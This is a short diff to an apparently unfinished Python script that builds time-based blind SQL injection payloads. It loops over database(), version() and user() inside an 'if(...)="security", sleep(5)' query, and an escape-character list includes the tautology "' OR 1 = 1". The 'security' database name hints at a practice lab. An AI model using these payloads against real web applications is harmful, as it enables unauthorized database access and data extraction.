@@ -31,8 +31,10 @@ def escape(url,param,list = ["\\",",","'","#","/",'"','.',"' OR 1 = 1"]) :      
 #Function to bruteforce information from the database
 def bruteforce():
     functions = ['database()','version(),user()']
-    payload = "?id=1' and if ((select database())=\"security\", sleep(5),\"null\"); --+"
+    for f in functions :
+        payload = "?id=1' and if (("+f+")=\"security\", sleep(5),\"null\"); --+"
     print(payload)
 
-            
 
+""" def len_find() :
+    payload =  """
